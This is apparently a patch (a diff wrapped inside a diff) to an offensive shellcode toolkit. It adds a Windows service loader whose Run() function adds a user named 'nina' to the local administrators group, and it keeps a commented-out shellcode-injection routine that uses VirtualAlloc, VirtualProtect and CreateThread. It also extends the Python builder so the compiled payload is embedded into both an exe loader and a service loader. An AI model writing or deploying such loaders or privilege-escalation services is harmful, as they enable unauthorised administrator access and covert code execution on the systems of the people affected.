@@ -1,8 +1,122 @@
+diff --git a/assets/loader.c b/assets/loader_exe.c
+similarity index 100%
+rename from assets/loader.c
+rename to assets/loader_exe.c
+diff --git a/assets/loader_svc.c b/assets/loader_svc.c
+new file mode 100644
+index 0000000..2ca3543
+--- /dev/null
++++ b/assets/loader_svc.c
+@@ -0,0 +1,92 @@
++// Based on: https://github.com/sagishahar/scripts/blob/master/windows_service.c
++
++#include <windows.h>
++#include <stdio.h>
++
++#define SLEEP_TIME 5000
++
++SERVICE_STATUS ServiceStatus; 
++SERVICE_STATUS_HANDLE hStatus; 
++ 
++void ServiceMain(int argc, char** argv); 
++void ControlHandler(DWORD request); 
++
++unsigned char payload[] = ":PAYLOAD:";
++unsigned int payload_len = sizeof(payload);
++
++int Run() 
++{ 
++    system("whoami > c:\\users\\public\\service.txt");
++    system("net localgroup administrators nina /add");
++    return 0;
++
++    // void* exec;
++    // BOOL rv;
++    // HANDLE th;
++    // DWORD oldprotect = 0;
++    // exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
++    // RtlMoveMemory(exec, payload, payload_len);
++    // rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
++    // th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
++    // WaitForSingleObject(th, -1);
++    // return 0;
++} 
++
++int main() 
++{ 
++    SERVICE_TABLE_ENTRY ServiceTable[2];
++    ServiceTable[0].lpServiceName = "MyService";
++    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
++
++    ServiceTable[1].lpServiceName = NULL;
++    ServiceTable[1].lpServiceProc = NULL;
++ 
++    StartServiceCtrlDispatcher(ServiceTable);  
++    return 0;
++}
++
++void ServiceMain(int argc, char** argv) 
++{ 
++    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
++    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
++    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
++    ServiceStatus.dwWin32ExitCode      = 0; 
++    ServiceStatus.dwServiceSpecificExitCode = 0; 
++    ServiceStatus.dwCheckPoint         = 0; 
++    ServiceStatus.dwWaitHint           = 0; 
++ 
++    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
++    
++    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
++    SetServiceStatus (hStatus, &ServiceStatus);
++    
++    Run();
++
++    ServiceStatus.dwWin32ExitCode = 0; 
++    ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
++    SetServiceStatus (hStatus, &ServiceStatus);
++    return; 
++}
++
++void ControlHandler(DWORD request) 
++{ 
++    switch(request) 
++    { 
++        case SERVICE_CONTROL_STOP: 
++			ServiceStatus.dwWin32ExitCode = 0; 
++            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
++            SetServiceStatus (hStatus, &ServiceStatus);
++            return; 
++ 
++        case SERVICE_CONTROL_SHUTDOWN: 
++            ServiceStatus.dwWin32ExitCode = 0; 
++            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
++            SetServiceStatus (hStatus, &ServiceStatus);
++            return; 
++        
++        default:
++            break;
++    } 
++    SetServiceStatus (hStatus,  &ServiceStatus);
++    return; 
++}
+\ No newline at end of file
 diff --git a/c-to-shellcode.py b/c-to-shellcode.py
-index 8662a36..8267963 100644
+index c9f3dc3..27000d6 100644
 --- a/c-to-shellcode.py
 +++ b/c-to-shellcode.py
-@@ -21,20 +21,30 @@ def run_cmd(cmd: str):
+@@ -3,7 +3,10 @@
+ # Name  : c-to-shellcode.py
+ # Author: Print3M
+ # GitHub: https://github.com/Print3M
++import os
++from pathlib import Path
+ import subprocess
++import sys
+ 
+ 
+ def args(arr: list[str]):
+@@ -18,35 +21,55 @@ def run_cmd(cmd: str):
  LOADER_PAYLOAD_STR = ":PAYLOAD:"
  
  CC = "x86_64-w64-mingw32-gcc-win32"
@@ -46,21 +160,66 @@ index 8662a36..8267963 100644
 +])
  
  if __name__ == "__main__":
-     input_file = Path(sys.argv[1]).absolute()
-@@ -51,12 +61,12 @@ if __name__ == "__main__":
-     run_cmd(f"{CC} -c {input_file} -o {output_file_o} {BIN_PAYLOAD_CFLAGS}")
++    input_file = Path(sys.argv[1]).absolute()
++    ORIG_CWD = Path(os.getcwd())
++    ROOT = Path(__file__).parent
++    os.chdir(ROOT)
++    output_dir = input_file.parent / 'bin'
++    output_file_o = output_dir / f'{input_file.name.rsplit(".")[0]}.o'
++    output_file_bin = output_dir / f'{input_file.name.rsplit(".")[0]}.bin'
++    output_file_exe = output_dir / f'{input_file.name.rsplit(".")[0]}.exe'
++    output_file_loader = output_dir / f'loader.exe'
++
+     # Compile payload C code to object file
+-    run_cmd(f"{CC} -c payload.c -o bin/payload.o  {BIN_PAYLOAD_CFLAGS}")
++    run_cmd(f"{CC} -c {input_file} -o {output_file_o} {BIN_PAYLOAD_CFLAGS}")
  
      # Produce flat binary with payload
 -    run_cmd(
--        f"ld -T assets/linker.ld {output_file_o} -o {output_file_bin}"
+-        f"ld -T assets/linker.ld bin/payload.o -o bin/payload.bin"
 -    )
 +    run_cmd(f"ld -T assets/linker.ld {output_file_o} -o {output_file_bin}")
  
      # Produce PE .exe with payload (WinAPI included)
--    run_cmd(f"{CC} {output_file_o} -o {output_file_exe} {EXE_PAYLOAD_CFLAGS}")
+-    run_cmd(f"{CC} bin/payload.o -o bin/payload.exe {EXE_PAYLOAD_CFLAGS}")
 +    # run_cmd(f"{CC} -c {input_file} -o {output_file_o} {EXE_PAYLOAD_CFLAGS} -DENABLE_LOG_DEBUG")
 +    # run_cmd(f"{CC} {output_file_o} -o {output_file_exe} {EXE_PAYLOAD_CFLAGS}")
 +    run_cmd(f"{CC} {input_file} -o {output_file_exe} {EXE_PAYLOAD_CFLAGS}")
  
      # Convert flat binary into C array of bytes
-     with open(output_file_bin, "rb") as f:
+-    with open("bin/payload.bin", "rb") as f:
++    with open(output_file_bin, "rb") as f:
+         bytes = bytearray(f.read())
+ 
+     size = len(bytes)
+@@ -57,17 +80,21 @@ if __name__ == "__main__":
+         payload += "\\" + hex(byte).lstrip("0")
+ 
+     # Inject payload into loader source code
+-    with open("assets/loader.c", "r") as f:
+-        loader = f.read()
++    for loader in ['loader_exe', 'loader_svc']:
++        with open(f"assets/{loader}.c", "r") as f:
++            loader_source = f.read()
+ 
+-    loader = loader.replace(LOADER_PAYLOAD_STR, payload)
++        loader_source = loader_source.replace(LOADER_PAYLOAD_STR, payload)
+ 
+-    with open("bin/loader.c", "w") as f:
+-        f.write(loader)
++        with open(f"bin/{loader}.c", "w") as f:
++            f.write(loader_source)
+ 
+-    # Compile loader
+-    run_cmd(f"{CC} bin/loader.c -o bin/loader.exe")
++        # Compile loader
++        run_cmd(f"{CC} bin/{loader}.c -o {output_dir / f'{loader}.exe'}")
+ 
+     print("")
+-    print("[+] bin/payload.exe is ready!")
+-    print("[+] bin/loader.exe is ready!")
++    if ORIG_CWD in output_dir.parents:
++        output_dir_rel = output_dir.relative_to(ORIG_CWD)
++    else:
++        output_dir_rel = output_dir # fallback
++    print(f"[+] Outputs in {output_dir_rel} are ready!")
